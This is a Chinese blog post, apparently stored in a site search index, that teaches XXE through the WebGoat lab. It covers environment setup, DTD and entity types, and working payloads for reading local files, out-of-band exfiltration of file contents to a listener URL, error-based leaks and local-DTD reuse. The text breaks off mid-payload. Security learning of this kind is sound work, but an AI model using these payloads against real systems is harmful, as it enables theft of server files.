<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从Webgoat学习XXE及其代码审计</title>
      <link href="/2021/08/19/cong-webgoat-xue-xi-xxe-ji-qi-dai-ma-shen-ji/"/>
      <url>/2021/08/19/cong-webgoat-xue-xi-xxe-ji-qi-dai-ma-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>1231</p><h2 id="目录-1"><a href="#目录-1" class="headerlink" title="目录"></a>目录</h2><p>123</p><h3 id="目录-2"><a href="#目录-2" class="headerlink" title="目录"></a>目录</h3><p>123</p><h3 id="目录-3"><a href="#目录-3" class="headerlink" title="目录"></a>目录</h3><p>123</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做为网络安全从业者，对大部分漏洞名称都熟悉，也大概知道怎么利用，能产生什么危害，比如本文要学习的XXE漏洞。在此之前，只知道这个漏洞是XML解析时存在了问题，引用了外部实体，利用可以用来读取文件、探测内网，某些情况还可以执行命令。但是代码中究竟存在了什么问题，怎么修复；XML实体是什么，都有哪些类型；XXE攻击的类型、利用环境和绕过等这些具体的问题就是只知其一不知其二了。本文从一个JAVA的漏洞环境搭建开始到熟悉XXE漏洞的基础知识，再到各种精妙的利用。</p><h1 id="IDEA配置Webgoat环境"><a href="#IDEA配置Webgoat环境" class="headerlink" title="IDEA配置Webgoat环境"></a>IDEA配置Webgoat环境</h1><p>选择<a href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">IDEA</a>作为JAVA调试工具，<a href="https://github.com/WebGoat/WebGoat">Webgoat</a>作为漏洞分析的靶场。使用IDEA调试模式运行Webgoat源码。</p><h2 id="IDEA汉化插件"><a href="#IDEA汉化插件" class="headerlink" title="IDEA汉化插件"></a>IDEA汉化插件</h2><p>在安装好IDEA后，可使用插件进行汉化，避免某些英语不认识导致误操作，在File-Setting-Plugins中搜索Chinese插件安装即可：<br><img src="https://i.loli.net/2021/08/04/bWxUQuoqHgkiZvT.png"><br>安装完成后重启软件进行使用：<br><img src="https://i.loli.net/2021/08/04/VNtxHrbmJDn6a8z.png"></p><h2 id="WebGoat配置"><a href="#WebGoat配置" class="headerlink" title="WebGoat配置"></a>WebGoat配置</h2><p>然后开始配置源码WebGoat-develop，这里是用IDEA2021.2来导入项目(2021.2选择文件夹打开，然后手动配置；2019.3.2中可以选择导入项目自动配置。)，通过mavn自动下载依赖来启动：<br><img src="https://i.loli.net/2021/08/04/gQJ9ojfDzOa21R5.png"><br>idea会自动下载mvn，默认位置在<code>C:\Users\&lt;用户名&gt;\.m2wrapper\dists\</code>中，需要在setting.xml中配置一下加速仓库地址：</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrors</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>alimaven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>aliyun maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirror</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>repo2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>repo2 maven<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url</span><span class="token punctuation">></span></span>http://repo2.maven.org/maven2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mirrorOf</span><span class="token punctuation">></span></span>central<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrorOf</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirror</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mirrors</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/04/tYbVoEzBQlZa1Mx.png"><br>在文件-项目结构中配置JDK版本(jdk-15,下载地址：<a href="http://jdk.java.net/15/">http://jdk.java.net/15/</a>):<br><img src="https://i.loli.net/2021/08/04/VnZADElt6gWNhCu.png"><br>然后在左上角🔨旁边的配置菜单里选择编辑项目配置,添加一个Spring Bot配置，名称为StartWebGoat，主类org.owasp.webgoat.StartWebGoat，这一步可能输入了主类会报错，提示找不到main函数，要等idea扫描一下类，然后就自己好了:<br><img src="https://i.loli.net/2021/08/04/rdx4onaIChsplJR.png"><br>同样配置webwolf(用来验证一些请求的服务，如SSRF之类的)，下面记得设置下更新操作,用来在代码中增加语句后热重载:<br><img src="https://i.loli.net/2021/08/04/zRCi1L4muDyWs2c.png"><br>点击调试按钮，访问本地8080，程序已经运行起来了:<br><img src="https://i.loli.net/2021/08/04/OQBXF76ckWJCLVH.png"><br>然后在<code>src/main/java/org/owasp/webgoat/users/UserService.java</code>中用户名检查断点，浏览器中登录，可以看到成功命中:<br><img src="https://i.loli.net/2021/08/05/Pmfyjs37RA9eVqO.png"><br>再试试热重载，加入一条打印语句，然后重载类:<br><img src="https://i.loli.net/2021/08/05/TSQNfmFGkIe5u2q.png"><br>已经输出了调试语句:<br><img src="https://i.loli.net/2021/08/05/8vltejyMwENUs7f.png"><br>使用burp抓包的时候，选择Firefox来抓包，需要设置本地的代理，在地址栏输入<code>about:config</code>，然后搜索<code>network.proxy.allow_hijacking_localhost</code>，设置为True：<br><img src="https://i.loli.net/2021/08/05/O8nuI1YxJLkUfTd.png"></p><h1 id="XML外部实体攻击-XXE"><a href="#XML外部实体攻击-XXE" class="headerlink" title="XML外部实体攻击(XXE)"></a>XML外部实体攻击(XXE)</h1><blockquote><p>XML 外部实体攻击(XXE)是针对解析 XML 输入的应用程序的一种攻击。当包含对外部实体的引用的 XML 输入被弱配置的 XML 解析器处理时，就会发生这种攻击。这种攻击可能导致机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描等系统影响。</p></blockquote><p><strong>XML的格式</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to,from,heading,body)></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/05/63rbgyjlxPaFUOD.png"></p><p><strong>文档类型定义（DTD）</strong><br>了解XML实体之前先熟悉下DTD，DTD 文件是一种特殊类型的 XML 文件，其中包含有关 XML 格式或结构的信息。它们用于在不同的、单独的 XML 文件之间建立一致性。这些 DTD 文件可以包含一个称为 ENTITY 的元素，DTD可以在XML内部也可以单独存在DTD文件中。XML实体在 DTD 中创建，实体可以利用协议进行系统调用。<br>内部的DOCTYPE声明：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note [  &lt;!ELEMENT note (to)></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">to</span> <span class="token attr-name">"123"</span><span class="token punctuation">></span></span>]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>!DOCTYPE note</code>定义文档的类型是note;<br><code>!ELEMENT note</code>定义note里的元素；<br><code>!ELEMENT to</code>定义元素to的数据类型是#PCDATA，也可以用ANY;<br><code>!ENTITY to</code>定义元素to的值<br>外部的DOCTYPE声明：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note SYSTEM "http://x.x.x.x/note.dtd"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>独立的DTD文件：</p><pre class="line-numbers language-dtd"><code class="language-dtd"><!ELEMENT note (to)><!ELEMENT to (#PCDATA)><!ENTITY to "123"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>XML实体类型</strong><br>实体是对数据引用，须在DTD中定义。XML中引用实体的方式是<code>&amp;实体名称;</code>，一般来说需要了解的有下面几种类型：<br><em>内部实体</em><br>ENTITY没有关键字<code>SYSTEM</code>，<code>PUBLIC</code>的实体。</p><pre class="line-numbers language-DTD"><code class="language-DTD"><?xml version="1.0" ?><!DOCTYPE note [  <!ELEMENT note (to)><!ENTITY to "123">]><root>&to;</root><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>外部实体</em><br>ENTITY中关键字为<code>SYSTEM</code>, <code>PUBLIC "id"</code>，具体值是链接指向的文件内容 。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e SYSTEM "file:///1.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE a [&lt;!ENTITY e PUBLIC "2" "file:///1.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&e;">&amp;e;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>参数实体</em><br>参数实体在dtd文件中或xml的dtd区中定义，定义格式为 <code>&lt;!ENTITY % 实体名称 "实体的值"&gt;</code>，引格式<code>%实体名称</code>， 参数实体只能在外部的DTD文件中被引用，参数实体解析优先级高于其他实体：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ENTITY % a SYSTEM "file:///1.txt"></span>%a;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数实体的使用需要注意下面几点：<br>1.在参数实体中可以引用其他参数实体，但参数实体的引用只能出现在外部DTD子集声明中。<br>2.参数实体需要使用参数实体引用。<br>为了理解参数实体的利用方式，在Webgoat中XXE例子中进行详细测试，如下位置，想通过param3引用data的值,</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE r [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % param3 "http://127.0.0.1:8090/txt=%data;">%param3;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送后出现了错误“参数实体引用 “%data;” 不能出现在 DTD 的内部子集中的标记内”：<br><img src="https://i.loli.net/2021/08/06/TCPgAf75lFbKJ24.png"><br>所以在外部DTD中用参数实体引用其他参数实体：<br><img src="https://i.loli.net/2021/08/06/vc1SYszAPWJHRq7.png"><br>这里发现%data并没有被替换成文件内容发送到http服务器上，这里注意到使用的是SYSTEM关键字，后面的会直接被当成链接请求了。所以这里既要把读取文件内容参数实体解析进去又要对外发起请求，这里要注意要使用参数实体引用参数实体，看下面的外部的DTD文件，要想解析data，得用p去引用，参数实体p的值也得满足dtd格式(至少这里是这样，否则会报错)，于是定义一个新的实体exfil来获得data的值:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/?id=%data;'>"> %p;%exfil;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样一来XML解析p定义的参数实体时发现还有个data要解析，于是就获取了文件内容替换，然后再引用新定义的参数实体exfil从链接中获取实体，从而发起了http请求，将数据带出：<br><img src="https://i.loli.net/2021/08/06/ohklO9aS31JQvXG.png"><br>这里注意到响应中抛出了异常:</p><pre class="line-numbers language-tex"><code class="language-tex">\u6587\u6863\u7C7B\u578B\u58F0\u660E\u5305\u542B\u6216\u6307\u5411\u7684\u6807\u8BB0\u58F0\u660E\u5FC5\u987B\u683C\u5F0F\u6B63\u786E\u3002   文档类型声明包含或指向的标记声明必须格式正确。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是因为引用外部的实体不是正确的dtd格式，将服务器返回一个正常的dtd格式，那么就正常了,POC:：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % data SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">%param3;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>777<span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>note.dtd:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.dtd</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">text</span> <span class="token attr-name">"Hi!!"</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/06/BcnVLmdYQWx1pKz.png"><br>到了这一步，理解了后面的就简单了起来。<br><em>字符实体</em><br>指用十进制格式(&amp;#aaa;)或十六进制格式(પ)来指定任意 Unicode 字符。对 XML 解析器而言，字符实体与直接输入指定字符的效果完全相同。<code>&amp;#x25;  =  %</code>，在a中的值使用字符实体转码%定义参数实体b：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ENTITY % a "&lt;!ENTITY &amp;#x25; b SYSTEM 'http://127.0.0.1:8090/ewq'></span>">%a;%b;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>XXE类型</strong><br>一般来说，可以分为以下类型的 XXE 攻击：<br>XXE回显注入(Classic XXE)        —一般的XXE,响应直接或间接返回资源内容<br>XXE盲注(Bind XXE) — 响应中不显示输出或错误<br>XXE报错注入(Error XXE) — 资源的内容在错误信息中返回<br>XXE DOS — 利用多重实体嵌套解析消耗服务器内存</p><p>在Webgoat中对几种注入进行测试。<br><em>XXE回显注入</em><br>先传入正常值可在评论列表获得回显信息:<br><img src="https://i.loli.net/2021/08/05/crvYTpLPI1uKA7h.png"><br>测试实体引用，使用DTD定义实体：<br><img src="https://i.loli.net/2021/08/05/AzvXFLMlokPZwUQ.png"><br>再测试外部实体的引用，使用HTTP协议引用外部DTD:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE a SYSTEM "http://127.0.0.1:8090/note.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>note.dtd：</p><pre class="line-numbers language-stylus"><code class="language-stylus">&lt;!ENTITY b <span class="token string">"this is dtd"</span>><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>观察到内容在评论出回显：<br><img src="https://i.loli.net/2021/08/05/vsgxY1NbPHZwoS3.png"><br>读取磁盘文件回显：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE text [    &lt;!ENTITY r SYSTEM "file:///C:\\windows\\system.ini"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&r;">&amp;r;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/06/h5LlsP1qiE9vCGV.png"><br>或者利用远程外部实体：</p><pre class="line-numbers language-mojolicious"><code class="language-mojolicious"><?xml version="1.0"?><!DOCTYPE r [<!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">%param3;]><comment><text>123&p;</text></comment><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>note.dtd：</p><pre class="line-numbers language-vhdl"><code class="language-vhdl"><span class="token operator">&lt;</span>!<span class="token keyword">ENTITY</span> % data SYSTEM <span class="token string">"file:///c://2.txt"</span><span class="token operator">></span><span class="token operator">&lt;</span>!<span class="token keyword">ENTITY</span> p <span class="token string">"%data;"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/06/jVDdwZtzBaroSRp.png"></p><p><em>XXE盲注</em><br>有时候没有办法获得回显信息(这里的测试环境会回显错误信息，假装看不见)，可以尝试利用带外数据(Out of Band, OOB)进行利用(或者利用一些延时、错误状态码等判断)：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [    &lt;!ENTITY % data SYSTEM "file:///c:/2.txt"></span>    &lt;!ENTITY % param3 SYSTEM "http://127.0.0.1:8090/note.dtd">    %param3;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity" title="&text;">&amp;text;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % p "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://127.0.0.1:8090/2.dtd?text=%data;'>"> %p;%send;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/09/SXeJzvnkUMfr85O.png"><br>这里是利用参数实体获取文件内容后，请求外部实体时将数据参数发送到服务器。但是如果文件内容存在多行时，会出现错误<code>ParseError at xx Message: Illegal character in URL</code><br><img src="https://i.loli.net/2021/08/09/mz9QTXw4v6qVUBD.png"><br>参考了一些文章<a href="https://landgrey.me/blog/9/">Java xxe oob 读取多行文件失败的原因</a>，发现是在jdk中做了限制，且在文件中包含一些如<code>%，&amp;</code>等特殊字符时也会抛出异常。一些协议(gopher)也在高版本中无法使用。</p><p>在测试该类型XXE时，可以使用服务工具<a href="https://github.com/TheTwitchy/xxer">XXER</a>，可以开启HTTP和FTP服务获取带外数据：<br><img src="https://i.loli.net/2021/08/17/dktDsNJ5bKirj9p.png"></p><p><em>XXE报错注入</em><br>这里是利用xml解析过程中http访问不到文件返回404造成报错，错误信息中将包含文件内容:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE r [&lt;!ENTITY % data3 SYSTEM "file:///c://2.txt"></span>&lt;!ENTITY % sp SYSTEM "http://127.0.0.1:8090/note.dtd">%sp;%param3;%exfil;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web服务器上8090端口托管的note.dtd:</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % param3 "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> exfil SYSTEM 'http://127.0.0.1:8090/txt=%data3;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到一边用带外收到了文件内容，一边也在错误信息中回显了：<br><img src="https://i.loli.net/2021/08/06/hArKmJiGBxvcp3S.png"><br>一般的都可以使用找不到文件的错误来进行回显，如下利用找不到本地的文件来回显信息：<br><img src="https://i.loli.net/2021/08/16/XbyqTiHR4rVI3KC.png"><br>用协议不存在报错读取多行包含<code>:</code>的文件：<br><img src="https://i.loli.net/2021/08/16/oHBbJMAwvGm8jLT.png"></p><p>==本地DTD利用==<br>在OOB无法实现但存在错误回显的情况下，可以通过加载一些本地DTD进行利用。主要原理是xml在使用实体时，如果两个实体名称相同，则仅使用第一个实体。这样就可以在xml内部对实体进行重新定义然后利用本地dtd来加载，例如在服务器本地存在如下dtd文件:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">"and</span> <span class="token attr-name">|</span> <span class="token attr-name">or</span> <span class="token attr-name">|</span> <span class="token attr-name">not</span> <span class="token attr-name">|</span> <span class="token attr-name">equal</span> <span class="token attr-name">|</span> <span class="token attr-name">contains</span> <span class="token attr-name">|</span> <span class="token attr-name">exists</span> <span class="token attr-name">|</span> <span class="token attr-name">subdomain-of"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(%condition;)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>dtd文件中有一个condition参数实体，然后在下面ELEMENT标签中对参数实体进行引用定义为pattern的元素。<br>那么在poc中利用如下：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % x SYSTEM "file:///C:\\FIle0.dtd"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">condition</span> <span class="token attr-name">'aaa)</span><span class="token punctuation">></span></span>       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> file SYSTEM "file:///C:/2.txt">       &lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&#x26;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="&#x27;">&amp;#x27;</span>file:///21.txt/<span class="token entity" title="&#x25;">&amp;#x25;</span>file;<span class="token entity" title="&#x27;">&amp;#x27;</span>>">       <span class="token entity" title="&#x25;">&amp;#x25;</span>eval;       <span class="token entity" title="&#x25;">&amp;#x25;</span>error;       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb'</span><span class="token punctuation">></span></span>%x;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/17/5pyNMBAWL7Y3zhK.png"><br>在poc中重新定义了condition,我们知道实体就是参数值的引用，就等于把condition的内容放到dtd中，引入时会自动解析一次编码，所以结果如下:</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">pattern</span> <span class="token attr-name">(</span> <span class="token attr-name">aaa)</span><span class="token punctuation">></span></span>       &lt;!ENTITY % file SYSTEM "file:///C:/2.txt">       &lt;!ENTITY % eval "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> error SYSTEM 'file:///21.txt/%file;'>">       %eval;       %error;       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">aa(bb)</span><span class="token 